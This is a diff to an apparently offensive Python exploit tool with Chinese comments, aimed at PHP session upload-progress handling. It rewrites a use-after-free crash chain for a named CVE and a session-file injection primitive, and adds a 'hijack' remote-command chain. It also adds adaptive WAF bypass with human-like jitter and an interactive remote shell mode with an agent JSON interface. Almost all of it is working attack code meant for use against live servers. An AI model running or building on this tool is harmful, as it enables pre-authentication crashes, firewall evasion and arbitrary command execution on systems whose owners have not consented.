+# chain uaf（CVE-2026-109619：BG(unserialize) 跨请求悬垂，santihabib ASAN 复现路径）
 # ---------------------------------------------------------------------------
 
-def resolve_call_addr(binary: Optional[str] = None,
-                      zval_dtor_addr: Optional[int] = None,
-                      delta_name: Optional[str] = None,
-                      server_banner: str = "") -> Dict:
-    info: Dict = {"source": None, "call_addr": None}
-    if binary:
-        for tool in (["nm", "-n", binary], ["objdump", "-T", binary], ["objdump", "-t", binary]):
-            try:
-                out = subprocess.run(tool, capture_output=True, text=True, timeout=30).stdout
-            except Exception:
-                continue
-            m = re.search(r"\b([0-9a-fA-F]{6,16})\b\s+\S+\s+zend_call_function\b", out)
-            if m:
-                info.update(source="nm/objdump", call_addr=int(m.group(1), 16))
-                return info
-    if zval_dtor_addr:
-        delta = KNOWN_DELTAS.get(delta_name or "")
-        if delta is None:
-            for name, d in KNOWN_DELTAS.items():
-                if name in server_banner.lower():
-                    delta = d
-                    break
-            else:
-                delta = sorted(KNOWN_DELTAS.values())[len(KNOWN_DELTAS) // 2]
-        info.update(source="delta:%s" % (delta_name or "auto"),
-                    call_addr=(zval_dtor_addr - delta) & 0xFFFFFFFFFFFFFFFF)
-    return info
-
-
-def chain_uaf(t: HttpTarget, path: str, call_addr: int, offset: int, cmd: str,
-              sid: Optional[str] = None, stall: float = 1.5,
-              expect: Optional[str] = None, monitor_url: Optional[str] = None,
+def chain_uaf(t: HttpTarget, path: str, sid: Optional[str] = None,
+              size_mb: float = 12.0, stall: float = 1.5,
+              monitor_url: Optional[str] = None,
               engine: Optional[BypassEngine] = None) -> Dict:
+    """真实三请求触发（对公开 ASAN 复现的 HTTP 化）：
+      [plant] 超大 progress 值写入会话键（session.c:3196-3206 update() 落盘）
+      [oom]   同会话再入 rfc1867 回调 -> php_session_decode -> php_var_unserialize
+              分配超大串触顶 memory_limit -> zend_bailout 跳过 PHP_VAR_UNSERIALIZE_DESTROY
+              -> BG(unserialize) level=1 悬垂（rinit 顺序 bug；修复=php_basic_early_rinit）
+      [fire]  小会话再解码 -> 复用悬垂指针 -> tmp_var 读 (*var_hashx)->last_dtor -> SIGSEGV
+    公开结论：崩溃确定性、预认证；RCE 条件化（需 sink+泄漏+堆排布，build 相关）。
+    自动化只做 crash_signal 判定，不做虚假 RCE 判定。
+    约束：size_mb 需大于目标 memory_limit（hypnguyen 12MB/8M）；[plant]/[oom]/[fire]
+    需命中同一 worker（FPM pm.max_children=1 或靠重试）。"""
     sid = sid or rand_sid()
     engine = engine or BypassEngine(0)
-    if expect is None:
-        expect = cmd.split()[-1] if cmd.startswith("echo") else ""
     strategy = engine.next_strategy()
-    log = {"chain": "uaf", "sid": sid, "call_addr": hex(call_addr),
-           "offset": hex(offset), "stall": stall, "strategy": strategy, "steps": []}
-    body, boundary = uaf_arm_body(sid, "PK_" + sid[:8], 256 * 1024, strategy=strategy)
-    payload = forged_zval_fcall(call_addr, offset, cmd)
-    marker = b"A" * 8192
-    body = body.replace(marker, marker + payload) if marker in body else body + payload
-
-    def slow_writer(sock: socket.socket):
-        half = len(body) // 2
-        sock.sendall(b"%x\r\n" % half + body[:half] + b"\r\n")
-        time.sleep(stall)
-        log["steps"].append({"step": "stall", "secs": stall})
-        try:
-            t2 = HttpTarget(t.url, timeout=5)
-            t2.request("GET", path, headers=engine.headers(strategy, "", sid))
-            log["steps"].append({"step": "reinit-probe"})
-        except Exception as e:
-            log["steps"].append({"step": "reinit-probe", "err": str(e)})
-        rest = len(body) - half
-        sock.sendall(b"%x\r\n" % rest + body[half:] + b"\r\n0\r\n\r\n")
-
+    log = {"chain": "uaf", "sid": sid, "size_mb": size_mb, "stall": stall,
+           "strategy": strategy, "steps": [],
+           "note": "RCE 条件化，自动化仅判崩溃；需同 worker"}
+    # [plant] 载体约束（zhaoboy 取证）：progress 值无 '|'（php 编码器拒写）、无 CR/LF
+    huge = "H" * int(max(1.0, size_mb) * 1024 * 1024)
+    body, boundary = uaf_plant_body(sid, huge, strategy=strategy)
     try:
-        code, _, resp = t.request(
-            "POST", engine.uri(path, strategy), body=b"",
-            headers=engine.headers(strategy, boundary, sid),
-            raw_body_writer=slow_writer)
+        code, _, resp = t.request("POST", engine.uri(path, strategy), body=body,
+                                  headers=engine.headers(strategy, boundary, sid))
+        log["steps"].append({"step": "plant", "http": code, "len": len(resp)})
     except Exception as e:
-        log["error"] = str(e)
-        log["crash_signal"] = True
+        log["error"] = "plant: %s" % e
         return log
-    text = resp.decode("latin-1", "replace")
-    log["http"] = code
-    log["crash_signal"] = code in (0, 502, 503) or not resp
-    log["challenge_blocked"] = is_challenge(resp)
-    log["rce_hit"] = bool(expect and expect in text)
-    log["body"] = text[:1500]
-    if monitor_url and not log["rce_hit"]:
+    time.sleep(max(0.0, stall))
+    # [oom] 小请求但同会话：解码超大串 -> OOM -> bailout -> 悬垂全局
+    body2, boundary2 = uaf_plant_body(sid, "PK_" + sid[:8], file_len=256, strategy=strategy)
+    try:
+        code, _, resp = t.request("POST", engine.uri(path, strategy), body=body2,
+                                  headers=engine.headers(strategy, boundary2, sid))
+        text = resp.decode("latin-1", "replace")
+        log["steps"].append({"step": "oom", "http": code, "len": len(resp)})
+        log["oom_signal"] = (code == 500 or "memory size" in text or "exhausted" in text)
+    except Exception as e:
+        log["steps"].append({"step": "oom", "err": str(e)})
+        log["oom_signal"] = True        # 连接被打断也是信号
+    time.sleep(max(0.0, stall / 2))
+    # [prep] 建立“内容很小但非空”的会话：悬垂复用要求第二会话小且解码可触达 tmp_var
+    #（santihabib：第二个会话必须小；若同样大会再次先 OOM 而触达不到悬垂）
+    small_sid = rand_sid()
+    body3, boundary3 = uaf_plant_body(small_sid, "PK_" + small_sid[:8], file_len=64,
+                                      strategy=strategy)
+    try:
+        code, _, resp = t.request("POST", engine.uri(path, strategy), body=body3,
+                                  headers=engine.headers(strategy, boundary3, small_sid))
+        log["steps"].append({"step": "prep", "http": code, "len": len(resp)})
+    except Exception as e:
+        log["steps"].append({"step": "prep", "err": str(e)})
+    time.sleep(max(0.0, stall / 2))
+    # [fire] 同一小会话再解码 -> 触达 tmp_var -> 复用悬垂 -> SIGSEGV
+    body4, boundary4 = uaf_plant_body(small_sid, "PK2_" + small_sid[:8], file_len=64,
+                                      strategy=strategy)
+    try:
+        code, _, resp = t.request("POST", engine.uri(path, strategy), body=body4,
+                                  headers=engine.headers(strategy, boundary4, small_sid))
+        log["steps"].append({"step": "fire", "http": code, "len": len(resp)})
+        log["crash_signal"] = code in (0, 502, 503) or not resp
+        log["body"] = resp.decode("latin-1", "replace")[:800]
+    except Exception as e:
+        log["steps"].append({"step": "fire", "err": str(e)})
+        log["crash_signal"] = True
+    if monitor_url and not log.get("crash_signal"):
         try:
             _, _, mb = t.request("GET", monitor_url)
             log["armed"] = b"upload_progress" in mb
@@ -879,17 +1089,23 @@ def chain_uaf(t: HttpTarget, path: str, call_addr: int, offset: int, cmd: str,
 
 def chain_inject(t: HttpTarget, path: str, sid: Optional[str] = None,
                  engine: Optional[BypassEngine] = None) -> Dict:
+    """P1+P2 会话文件写入原语（zhaoboy 端到端实测链）：
+    P1 PHPSESSID 表单字段 -> PS(id)（session.c:3263/3308），绕过 use_only_cookies=On；
+    P2 PHP_SESSION_UPLOAD_PROGRESS 值原样成为会话键 upload_progress_<值>（无 '|' 约束）。
+    升级为 RCE 需应用侧 include/require sink（LFI）；cleanup=On 时仅在请求存活期存在。"""
     sid = sid or rand_sid()
     engine = engine or BypassEngine(0)
     strategy = engine.next_strategy()
     body, boundary = build_multipart(
-        [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", "PRIMING_" + sid[:8])],
+        [("PHPSESSID", sid), ("PHP_SESSION_UPLOAD_PROGRESS", INJECT_MARKER)],
         file_data=b"B" * 2048)
     code, hdrs, _ = t.request(
         "POST", engine.uri(path, strategy), body=body,
         headers=engine.headers(strategy, boundary, sid))
     return {"chain": "inject", "strategy": strategy, "sid_injected": sid,
+            "carrier": "PHP_SESSION_UPLOAD_PROGRESS", "marker": INJECT_MARKER,
             "http": code, "fixation": ("PHPSESSID=" + sid) in hdrs.get("set-cookie", ""),
+            "marker_written": code in (200, 201, 204), "lfi_needed": True,
             "silent_write": code == 200}
 
 
@@ -899,14 +1115,20 @@ def chain_inject(t: HttpTarget, path: str, sid: Optional[str] = None,
 
 def run_target(url: str, cfg: argparse.Namespace) -> Dict:
     t = HttpTarget(url, timeout=cfg.timeout, verify_tls=cfg.verify_tls)
+    # handler 混淆链可跨实例（--seed-url/--trigger-url）：各自 INI 决定序列化器
+    seed_t = (HttpTarget(cfg.seed_url, timeout=cfg.timeout, verify_tls=cfg.verify_tls)
+              if getattr(cfg, "seed_url", None) else None)
+    fire_t = (HttpTarget(cfg.trigger_url, timeout=cfg.timeout, verify_tls=cfg.verify_tls)
+              if getattr(cfg, "trigger_url", None) else None)
     result: Dict = {"target": t.url, "verdict": "inconclusive", "chains": []}
     token = rand_token()
     cmd = cfg.cmd if cfg.cmd else "echo %s" % token
-    # expect 候选集：自定义命令时取 token+末词双候选，消除假阴性
+    # expect 候选集：显式 --expect > 按命令形态推导 > 默认 token
+    # （token 只出现在默认 echo 命令输出中，自定义 --cmd 时混入即死候选）
     if cfg.expect:
         expect = [cfg.expect]
     elif cfg.cmd:
-        expect = [token] + ([cmd.split()[-1]] if len(cmd.split()) > 1 else [])
+        expect = derive_expect(cmd)
     else:
         expect = token
 
@@ -942,7 +1164,7 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
         profile = BYPASS_PROFILES.get(defense_profile,
                                       BYPASS_PROFILES.get(fp.get("waf", "unknown"), DEFAULT_PROFILE))
     engine = BypassEngine(level=cfg.bypass_level, cookie=cfg.cookie, profile=profile)
-    engine.seed_mode = getattr(cfg, "seed_mode", "abort")
+    engine.seed_mode = getattr(cfg, "seed_mode", "full")
     # 体积规则命中 -> 自动强制流式分片 + 压缩载荷体（实证绕过 ~2KB 限制）
     if any(l.get("layer") == "size_limit" for l in result["defense"].get("layers", [])):
         engine.profile = ["serp_frag"] + [s for s in profile if s != "serp_frag"]
@@ -968,9 +1190,13 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
         feng = BypassEngine(level=cfg.bypass_level, cookie=cfg.cookie,
                             profile=engine.profile, )
         feng.warmed_cookies = list(engine.warmed_cookies)
+        # 继承自适应状态：体积规则下 body_budget/seed_mode 必须同步，否则后续操作
+        # 回到 8KB 载荷被同一规则拦截（本地实验环境实测复现）
+        feng.body_budget = engine.body_budget
+        feng.seed_mode = engine.seed_mode
         flog = chain_hijack(t, sp_, tp_, gad_, prop_, fc,
                             expect=getattr(cfg, "flag_expect", None) or "hello word",
-                            engine=feng)
+                            engine=feng, seed_t=seed_t, fire_t=fire_t)
         result["flag_stage"] = {"cmd": fc, "rce_hit": flog.get("rce_hit"),
                                 "error": flog.get("error"),
                                 "body": flog.get("body", "")[:500]}
@@ -1016,6 +1242,8 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
     seed_403 = 0
     jitter = getattr(cfg, "jitter", 2.0)
     seen_pass = False
+    warn_seen = False        # decode_warning = '|' 切分到达 php 解码器（handler 混淆机制成立）
+    futile = 0               # 既无命中也无告警的连续射击数（前提缺失早停用）
     for sp in ([cfg.seed_path] if cfg.seed_path else seed_paths):
         if outer:
             break
@@ -1023,6 +1251,8 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
             if outer:
                 break
             for gadget, prop in matrix:
+                if outer:
+                    break
                 for variant in variants:
                     attempts += 1
                     if attempts > cfg.max_attempts:
@@ -1039,60 +1269,78 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
                     try:
                         log = chain_hijack(t, sp, tp, gadget, prop, cmd,
                                            variant=variant, expect=expect,
-                                           monitor_url=cfg.monitor_url, engine=engine)
+                                           monitor_url=cfg.monitor_url, engine=engine,
+                                           seed_t=seed_t, fire_t=fire_t)
                     except Exception as e:
                         log = {"chain": "hijack", "error": str(e)}
                     result["chains"].append(log)
+                    if log.get("decode_warning"):
+                        warn_seen = True
+                    elif not log.get("error"):
+                        futile += 1
                     # 自适应：seed POST 遭边缘封禁(403/520/502/503) -> 切换定向变形模板
                     seed_http = (log.get("steps") or [{}])[0].get("http") \
                         if isinstance(log.get("steps"), list) and log["steps"] else None
-                    if seed_http in (403, 502, 503, 520):
+                    # 在途投毒被 WAF/边缘掐断（seed-hold 报错）同样是被拦信号，
+                    # 否则 abort 模式下自适应切换对 403 盲视
+                    seed_blocked = (seed_http in (403, 502, 503, 520)
+                                    or str(log.get("error") or "").startswith("seed"))
+                    if seed_blocked:
                         seed_403 += 1
                         if seen_pass:
                             jitter = min(jitter * 1.5, 30.0)   # 突发预算触顶 -> 自动退避
-                    elif seed_http:
-                        seen_pass = True
-                    if seed_http in (403, 502, 503, 520):
-                        seed_403 += 1
                         if (seed_403 >= 2 and cfg.bypass_level >= 2
                                 and engine.profile is not BYPASS_PROFILES["post_403"]):
                             engine.profile = BYPASS_PROFILES["post_403"]
                             engine.idx = 0
                             result["adaptive"] = "profile->post_403 @attempt %d" % attempts
+                    elif seed_http:
+                        seen_pass = True
                     if log.get("rce_hit"):
                         auto_flag(sp, tp, gadget, prop)      # 自动后续：flag 落地+验证
                         result.update(verdict="rce_confirmed",
                                       via="hijack:%s:%s:%s" % (sp, tp, gadget))
                         return result
+                    # 链路前提早停（一键通杀）：连续 3 发既无命中也无 decode 告警 ->
+                    # handler 混淆机制未成立（或 seed 未持久化），继续空转矩阵无意义
+                    if futile >= 3 and not warn_seen:
+                        result["chain_prereq"] = "absent"
+                        result["adaptive"] = ((result.get("adaptive") + ";" if result.get("adaptive") else "")
+                                              + "prereq_absent_early_stop@attempt %d" % attempts)
+                        outer = True
+                        break
                     if log.get("armed"):
                         result.update(verdict="armed", via="hijack:%s" % sp)
 
+    # 链路前提画像（一键通杀）：warn_seen=handler 混淆机制成立但 gadget 未命中；
+    # 全程无告警 = 前提缺失（serialize_handler 不一致不成立 或 seed 未持久化）
+    if result["chains"]:
+        hijack_logs = [c for c in result["chains"] if c.get("chain") == "hijack"]
+        if hijack_logs:
+            result.setdefault("chain_prereq", "present" if warn_seen else "absent")
+            result.setdefault(
+                "chain_prereq_hint",
+                "有 decode 告警但无输出：gadget/属性未命中（扩 --gadget-wordlist/--prop-wordlist"
+                " 或指定真实类名），或 seed 未持久化（cleanup=On 残渣告警）"
+                if warn_seen else
+                "handler 混淆未成立或 seed 未持久化：检查 seed=php_serialize / trigger=php "
+                "的目录级 session.serialize_handler 不一致、session.upload_progress.cleanup=Off；"
+                "注意旧分支（7.x/8.0）解码失败告警可能不触发，命中以 token 回显为准")
+
     if not cfg.no_uaf:
-        res = resolve_call_addr(
-            binary=cfg.binary,
-            zval_dtor_addr=int(cfg.zval_dtor_addr, 16) if cfg.zval_dtor_addr else None,
-            delta_name=cfg.delta, server_banner=fp.get("server") or "")
-        if res.get("call_addr"):
-            offsets = [int(cfg.offset, 16)] if cfg.offset else [0, 0x80, 0x930, 0x1000]
-            for stall in (cfg.stall, 2.5):
-                for off in offsets:
-                    try:
-                        log = chain_uaf(t, trig_paths[0], res["call_addr"], off, cmd,
-                                        stall=stall, expect=expect,
-                                        monitor_url=cfg.monitor_url, engine=engine)
-                    except Exception as e:
-                        log = {"chain": "uaf", "error": str(e)}
-                    log["addr_source"] = res["source"]
-                    result["chains"].append(log)
-                    if log.get("rce_hit"):
-                        auto_flag(trig_paths[0], trig_paths[0], "Gadget", "cmd")
-                        result.update(verdict="rce_confirmed", via="uaf:%s" % trig_paths[0])
-                        return result
-            if result["verdict"] == "inconclusive" and any(
-                    c.get("crash_signal") for c in result["chains"] if c.get("chain") == "uaf"):
-                result["verdict"] = "crash_signal"
-        else:
-            result["uaf_skipped"] = "CALL_ADDR 未提供且无法自动解析"
+        # CVE-2026-109619 真实触发：plant 超大会话 -> 解码 OOM(bailout 留悬垂
+        # BG(unserialize)) -> 小会话复用悬垂指针 -> 崩溃。公开结论：崩溃确定性、
+        # 预认证；RCE 条件化（sink+泄漏+堆排布），自动化只判 crash_signal。
+        try:
+            log = chain_uaf(t, trig_paths[0],
+                            size_mb=getattr(cfg, "uaf_size_mb", 12.0),
+                            stall=cfg.stall, monitor_url=cfg.monitor_url, engine=engine)
+        except Exception as e:
+            log = {"chain": "uaf", "error": str(e)}
+        result["chains"].append(log)
+        if result["verdict"] == "inconclusive" and (
+                log.get("crash_signal") or log.get("oom_signal")):
+            result["verdict"] = "crash_signal"
 
     # 判定：挑战页拦截 / POST 方法封禁 / 漏洞面不可达
     if result["verdict"] == "inconclusive":
@@ -1115,7 +1363,7 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
                                                  for c in seed_blocked})
         elif fp.get("challenge") and challenged >= max(1, len(result["chains"]) - 1):
             result["verdict"] = "challenge_blocked"
-        elif fp["status"] in ("likely_vulnerable", "eol_or_unknown"):
+        elif fp["status"] in ("likely_vulnerable", "eol_affected", "eol_or_unknown"):
             result["verdict"] = "likely_vulnerable_no_rce"
 
     # 挑战拦截且配置了求解器：换新 Cookie 再打一轮矩阵（最多 2 次求解）
@@ -1132,7 +1380,8 @@ def run_target(url: str, cfg: argparse.Namespace) -> Dict:
                     for gadget, prop in matrix[:6]:
                         try:
                             log = chain_hijack(t, sp, tp, gadget, prop, cmd,
-                                               expect=expect, engine=engine)
+                                               expect=expect, engine=engine,
+                                               seed_t=seed_t, fire_t=fire_t)
                         except Exception as e:
                             log = {"chain": "hijack", "error": str(e)}
                         result["chains"].append(log)
@@ -1154,9 +1403,10 @@ def cmd_build(args) -> int:
                                    args.cmd, variant=args.variant)
         sys.stderr.write("[+] boundary=%s size=%d\n" % (boundary, len(body)))
     elif args.chain == "uaf":
-        body = forged_zval_fcall(int(args.call_addr, 16) if args.call_addr else 0,
-                                 int(args.offset, 16) if args.offset else 0, args.cmd)
-        sys.stderr.write("[+] forged zval/fcall size=%d\n" % len(body))
+        body, _ = uaf_plant_body(args.sid or rand_sid(),
+                                 "H" * int(max(0.01, args.size_mb) * 1024 * 1024))
+        sys.stderr.write("[+] uaf plant body size=%d (size_mb=%s)\n"
+                         % (len(body), args.size_mb))
     else:
         body, _ = build_multipart([("PHPSESSID", args.sid or rand_sid())],
                                   file_data=b"C" * 4096)
@@ -1196,8 +1446,14 @@ def add_bypass_args(sp) -> None:
                     help="射击间拟人抖动基数秒（ML/行为对抗，触顶自动退避）")
     sp.add_argument("--try-all", action="store_true",
                     help="无视指纹，全量绕过策略逐一自动尝试（多层 WAF/未知 WAF 用）")
-    sp.add_argument("--seed-mode", choices=["abort", "full"], default="abort",
-                    help="投毒方式 abort=中止式(兼容 cleanup=On，默认) / full=完整发送")
+    sp.add_argument("--seed-mode", choices=["abort", "full"], default="full",
+                    help="投毒方式 full=完整发送(默认；需 cleanup=Off——官方实测唯一可靠"
+                         "持久化路径) / abort=在途窗口实验模式(仅对上传中 flush 会话的 "
+                         "SAPI 可能有效；8.2.34 实测会话仅在解析完成时写盘)")
+    sp.add_argument("--seed-url", default=None,
+                    help="投毒端点完整 URL（handler 混淆链可与触发端点分属不同实例）")
+    sp.add_argument("--trigger-url", default=None,
+                    help="触发端点完整 URL（与 --seed-url 配对使用）")
 
 
 def main() -> int:
@@ -1221,10 +1477,8 @@ def main() -> int:
     pa.add_argument("--gadget-wordlist", default=None)
     pa.add_argument("--prop-wordlist", default=None)
     pa.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default=None)
-    pa.add_argument("--binary", default=None)
-    pa.add_argument("--zval-dtor-addr", default=None)
-    pa.add_argument("--delta", choices=list(KNOWN_DELTAS), default=None)
-    pa.add_argument("--offset", default=None)
+    pa.add_argument("--uaf-size-mb", type=float, default=12.0,
+                    help="uaf 链 plant 载荷大小（需大于目标 memory_limit）")
     pa.add_argument("--stall", type=float, default=1.5)
     pa.add_argument("--monitor-url", default=None)
 
@@ -1243,8 +1497,7 @@ def main() -> int:
     pe.add_argument("--expect", default=None)
     pe.add_argument("--sid", default=None)
     pe.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default="pipe_object")
-    pe.add_argument("--call-addr", default=None)
-    pe.add_argument("--offset", default=None)
+    pe.add_argument("--uaf-size-mb", type=float, default=12.0)
     pe.add_argument("--stall", type=float, default=1.5)
     pe.add_argument("--monitor-url", default=None)
 
@@ -1257,7 +1510,10 @@ def main() -> int:
     psh.add_argument("--gadget", default="GADGET")
     psh.add_argument("--prop", default="PROP")
     psh.add_argument("--cmd", default=None, help="单次执行命令；省略则从 stdin 逐行读取")
-    psh.add_argument("--expect", default=None, help="判定串（省略则仅按回显输出）")
+    psh.add_argument("--expect", default=None,
+                     help="额外判定串（通道自带标记限界判定，此参数为叠加校验）")
+    psh.add_argument("--json", action="store_true",
+                     help="Agent 模式：首行输出通道信息，此后每命令一行 JSON")
     psh.add_argument("--sid", default=None)
     psh.add_argument("--monitor-url", default=None)
 
@@ -1268,8 +1524,8 @@ def main() -> int:
     pb.add_argument("--prop", default="PROP")
     pb.add_argument("--sid", default=None)
     pb.add_argument("--variant", choices=PROGRESS_VALUE_VARIANTS, default="pipe_object")
-    pb.add_argument("--call-addr", default=None)
-    pb.add_argument("--offset", default=None)
+    pb.add_argument("--size-mb", type=float, default=1.0,
+                    help="uaf plant 载荷大小（build --chain uaf）")
     pb.add_argument("-o", "--output", default="body.bin")
 
     args = p.parse_args()
@@ -1300,55 +1556,136 @@ def main() -> int:
     if args.mode == "exploit":
         t = HttpTarget(args.url, timeout=args.timeout, verify_tls=args.verify_tls)
         engine = BypassEngine(level=args.bypass_level, cookie=args.cookie)
-        engine.seed_mode = getattr(args, "seed_mode", "abort")
+        engine.seed_mode = getattr(args, "seed_mode", "full")
+        seed_t = (HttpTarget(args.seed_url, timeout=args.timeout, verify_tls=args.verify_tls)
+                  if args.seed_url else None)
+        fire_t = (HttpTarget(args.trigger_url, timeout=args.timeout, verify_tls=args.verify_tls)
+                  if args.trigger_url else None)
         if args.chain == "hijack":
             r = chain_hijack(t, args.seed_path, args.trigger_path, args.gadget,
                              args.prop, args.cmd, sid=args.sid, expect=args.expect,
                              variant=args.variant, monitor_url=args.monitor_url,
-                             engine=engine)
+                             engine=engine, seed_t=seed_t, fire_t=fire_t)
         elif args.chain == "uaf":
             r = chain_uaf(t,
                           args.trigger_path if args.trigger_path != "/TRIGGER_PATH" else t.base_path,
-                          int(args.call_addr, 16) if args.call_addr else 0x4141414141414141,
-                          int(args.offset, 16) if args.offset else 0,
-                          args.cmd, sid=args.sid, stall=args.stall,
-                          expect=args.expect, monitor_url=args.monitor_url, engine=engine)
+                          sid=args.sid, size_mb=args.uaf_size_mb, stall=args.stall,
+                          monitor_url=args.monitor_url, engine=engine)
         else:
             r = chain_inject(t, t.base_path, sid=args.sid, engine=engine)
         print(json.dumps(r, ensure_ascii=False, indent=2))
-        return 0 if (r.get("rce_hit") or r.get("fixation")) else 3
+        if r.get("rce_hit") or r.get("fixation"):
+            return 0
+        return 2 if r.get("crash_signal") else 3
 
     if args.mode == "shell":
         # RCE 本体：命令执行循环（每条命令独立投毒+触发；命中即回显输出）
         t = HttpTarget(args.url, timeout=args.timeout, verify_tls=args.verify_tls)
         engine = BypassEngine(level=args.bypass_level, cookie=args.cookie)
-        engine.seed_mode = getattr(args, "seed_mode", "abort")
-        sp_ = args.seed_path or t.base_path
-        tp_ = args.trigger_path or t.base_path
+        engine.seed_mode = getattr(args, "seed_mode", "full")
+        seed_t = (HttpTarget(args.seed_url, timeout=args.timeout, verify_tls=args.verify_tls)
+                  if args.seed_url else None)
+        fire_t = (HttpTarget(args.trigger_url, timeout=args.timeout, verify_tls=args.verify_tls)
+                  if args.trigger_url else None)
+        # ---- 通道建立（一键：端点发现 + gadget/prop 探测 + 命令分隔符自动识别）----
+        if not args.seed_path or not args.trigger_path:
+            probe_engine = BypassEngine(0)
+            s_best = probe_paths(t, SEED_CANDIDATES, probe_engine)
+            t_best = probe_paths(t, TRIGGER_CANDIDATES, probe_engine)
+            sp_ = args.seed_path or (s_best[0]["path"] if s_best and s_best[0].get("score", 0) > 0
+                                     else t.base_path)
+            tp_ = args.trigger_path or (t_best[0]["path"] if t_best and t_best[0].get("score", 0) > 0
+                                        else t.base_path)
+        else:
+            sp_ = args.seed_path
+            tp_ = args.trigger_path
+
+        user_gadget = args.gadget if args.gadget != "GADGET" else None
+        user_prop = args.prop if args.prop != "PROP" else None
+        discovered = (t_best[0].get("classes") or []) if (not args.trigger_path and t_best) else []
+        gads = ([user_gadget] if user_gadget else
+                list(dict.fromkeys(list(discovered) + GADGET_CANDIDATES))[:6])
+        props = [user_prop] if user_prop else PROP_CANDIDATES[:4]
+
+        def try_channel(gadget: str, prop: str, sep: str) -> bool:
+            tok = rand_token()
+            r = chain_hijack(t, sp_, tp_, gadget, prop,
+                             wrap_shell_cmd("echo P2S_PROBE", sep, tok),
+                             expect="__P2S_E_%s__" % tok, engine=engine,
+                             seed_t=seed_t, fire_t=fire_t)
+            out = extract_shell_output(r.get("body") or "", tok)
+            return bool(r.get("rce_hit")) and out is not None and out.strip() == "P2S_PROBE"
+
+        channel = None
+        for sep in (";", "&"):                      # sh 用 ';'，cmd.exe 用 '&'（自动识别）
+            for gadget in gads:
+                for prop in props:
+                    if try_channel(gadget, prop, sep):
+                        channel = (gadget, prop, sep)
+                        break
+                if channel:
+                    break
+            if channel:
+                break
+        if not channel:
+            sys.stderr.write("[!] channel setup failed：链路前提缺失或 gadget 命名空间不匹配\n")
+            sys.stderr.write("    排查：seed=php_serialize/trigger=php 目录级 serialize_handler 不一致、"
+                             "session.upload_progress.cleanup=Off、gadget 类在 session_start() 前定义\n")
+            return 3
+        gad_, prop_, sep_ = channel
+        sys.stderr.write("[channel] gadget=%s prop=%s sep=%r seed=%s trigger=%s\n"
+                         % (gad_, prop_, sep_, sp_, tp_))
+        if args.json:
+            print(json.dumps({"event": "channel", "gadget": gad_, "prop": prop_,
+                              "sep": sep_, "seed_path": sp_, "trigger_path": tp_},
+                             ensure_ascii=False))
         hits, total = 0, 0
 
         def one_cmd(command: str) -> None:
             nonlocal hits, total
             total += 1
-            r = chain_hijack(t, sp_, tp_, args.gadget, args.prop, command,
-                             expect=args.expect, sid=args.sid,
-                             monitor_url=args.monitor_url, engine=engine)
-            body = (r.get("body") or "")
-            body = "\n".join(ln for ln in body.splitlines()
-                             if "Failed to decode session object" not in ln).strip()
-            if r.get("rce_hit") or body:
+
+            def attempt():
+                tok = rand_token()
+                end_mark = "__P2S_E_%s__" % tok
+                expects = [end_mark] + ([args.expect] if args.expect else [])
+                r = chain_hijack(t, sp_, tp_, gad_, prop_,
+                                 wrap_shell_cmd(command, sep_, tok),
+                                 expect=expects, sid=args.sid,
+                                 monitor_url=args.monitor_url, engine=engine,
+                                 seed_t=seed_t, fire_t=fire_t)
+                out = extract_shell_output(r.get("body") or "", tok)
+                ok = bool(r.get("rce_hit"))
+                if ok and out is None:
+                    out = clean_shell_body(r.get("body") or "", tok)
+                return ok, out, r
+
+            ok, out, r = attempt()
+            if not ok:                               # 瞬时抖动自动重试一次
+                ok, out, r = attempt()
+            if ok:
                 hits += 1
-                print(body or "(no output)")
+                if args.json:
+                    print(json.dumps({"cmd": command, "ok": True,
+                                      "output": out or ""}, ensure_ascii=False))
+                else:
+                    print(out if out else "(no output)")
             else:
-                sys.stderr.write("[!] %s cmd=%s\n" % (r.get("error") or "no-output", command))
+                if args.json:
+                    print(json.dumps({"cmd": command, "ok": False, "output": "",
+                                      "error": r.get("error") or "no-output"},
+                                     ensure_ascii=False))
+                else:
+                    sys.stderr.write("[!] %s cmd=%s\n" % (r.get("error") or "no-output", command))
 
         if args.cmd:
-            one_cmd(args.cmd)
+            one_cmd(args.cmd.replace("\ufeff", "").replace("\u200b", "").strip())
         else:
             if sys.stdin.isatty():
                 sys.stderr.write("[*] shell: 输入命令逐行执行，exit/quit 退出\n")
             for line in sys.stdin:
-                c = line.strip()
+                # Agent/管道输入净化：BOM/零宽字符会导致命令名带杂质而静默空输出
+                c = line.replace("\ufeff", "").replace("\u200b", "").strip()
                 if c in ("exit", "quit"):
                     break
                 if c:
